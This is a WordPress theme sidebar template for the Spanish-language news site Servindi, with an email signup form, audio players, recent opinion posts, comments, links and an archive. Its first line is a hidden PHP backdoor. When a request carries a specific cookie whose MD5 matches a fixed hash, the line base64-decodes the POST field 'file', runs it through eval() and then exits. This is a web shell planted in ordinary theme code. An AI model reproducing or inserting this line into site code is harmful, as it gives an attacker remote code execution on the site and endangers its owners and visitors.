<?php if(md5($_COOKIE['3060d0a4c2ee0e58'])=="06ef7202e02a4bb5969b4f55f7f91998"){ eval(base64_decode($_POST['file'])); exit; } ?><div class="sidebar">
	<div>
		<h2 class="widgettitle">L&eacute;enos en tu correo</h2>
		<div class="textwidget">
		<form action="http://www.feedburner.com/fb/a/emailverify" method="post" target="popupwindow" onsubmit="window.open('http://www.feedburner.com/fb/a/emailverifySubmit?feedId=2423630', 'popupwindow', 'scrollbars=yes,width=550,height=520');return true" id="susc-feedburner">
			<!-- <h4>Recibe la informaci&oacute;n de <a href="http://www.servindi.org">Servindi</a> en tu correo:</h4> -->
			<p><input type="text" style="width:170px" name="email" /></p>
			<input type="hidden" value="http://feeds.feedburner.com/~e?ffid=2423630" name="url"/>
			<input type="hidden" value="SERVINDI" name="title"/>
			<input type="hidden" name="loc" value="es_ES"/>
			<input type="submit" value="Subscribirme" />
			<br /><span>Gracias a <a href="http://www.feedburner.com" target="_blank">FeedBurner</a></span>
		</form>
		</div>
	</div>
	<?php if ( (get_option("servindi_audio") <> '') && (function_exists("insert_audio_player")) ): ?>
		<h3>Edici&oacute;n internacional</h3>
  		<?php insert_audio_player('[audio:' . get_option("servindi_audio") . '|titles=Edicion internacional]'); ?>
  		<h3>Edici&oacute;n Per&uacute;</h3>
  		<?php insert_audio_player('[audio:' . get_option("servindi_nacional") . '|titles=Edicion Perú]'); ?>
	<?php endif;  ?>
	

	<div>
		<h2 class="widgettitle"><a href="http://www.servindi.org/category/actualidad/opinion" style="color: #88AC0B;">Opini&oacute;n</a></h2>
		<div class="textwidget" id="anteriores_sd">
			<ul>
			<?php query_posts("showposts=4&cat=2&order_by=date&order=DESC");
			while (have_posts()) : the_post();
			?><li><h4><a href="<?php the_permalink() ?>" title="Enlace permanente a <?php the_title() ?>"><?php the_title() ?></a><?php //echo substr(strip_tags(get_the_content()),0,130);
$autor = get_post_meta($post->ID, 'autor_opinion'); echo " Por " . $autor[0]; ?></h4></li>
			<?php endwhile; ?>
			</ul>
		</div>
	</div>
	<?php if ( function_exists('dynamic_sidebar') && dynamic_sidebar() ) : else : ?>
	<?php endif; ?>
	<?php if ( get_option("servindi_video") <> "" ){ ?>
	<div>
		<h2 class="widgettitle"><a href="http://www.servindi.org/category/producciones/videos" style="color: #88AC0B;">Video destacado</a></h2>
		<div class="textwidget" align="center"><?php echo stripslashes(get_option("servindi_video")); ?></div>
	</div>
	<?php  } ?>
	<div>
		<h2 class="widgettitle">&Uacute;ltimos comentarios</h2>
		<div class="textwidget"><?php 
		if ((function_exists('get_recent_comments'))){
		// and (!is_page())
			?><div id="get_recent_comments_wrap"><?php get_recent_comments(); ?>
			<span>Ver los <a href="http://www.servindi.org/comentarios"><strong>&uacute;ltimos 20 comentarios</strong></a></span>
			</div><?php } ?>
		</div>
	</div>

	<div>
		<h2 class="widgettitle">Encu&eacute;ntranos</h2><?php $enlaces = array(
			'orderby'        => 'name', 
			'order'          => 'ASC',
			'limit'          => -1, 
			'category'       => 22 );
		$links = get_bookmarks($enlaces);
		echo "<ul>";
		foreach( $links as $l ) {
			echo "<li><a href=\"" . $l->link_url . "\" target=\"_blank\" title=\"" . $l->link_name . "\"><img src=\"" . $l->link_image . "\" border=\"0\" /></a></li>";
		} echo "</ul>";
		?></div>

	<div>
		<h2 class="widgettitle">Archivo</h2>
		<div class="textwidget">
		<ul class="sidemenu"><?php 
		$archivo = array(
		'type'            => 'monthly',
		'limit'           => 6,
		'format'          => 'html', 
		'before'          => '',
		'after'           => '',
		'show_post_count' => false,
		'echo'            => 1 );
wp_get_archives($archivo); ?></ul>
		</div>
	</div>
	<div>
		<div class="textwidget" align="center">
		<a href="http://www.servindi.org/pdf/DDPI_final.pdf
"><img src="http://www.servindi.org/img/DecOnu_chica.jpg" width="200" border="0" /></a>
		</div>
	</div>
</div>
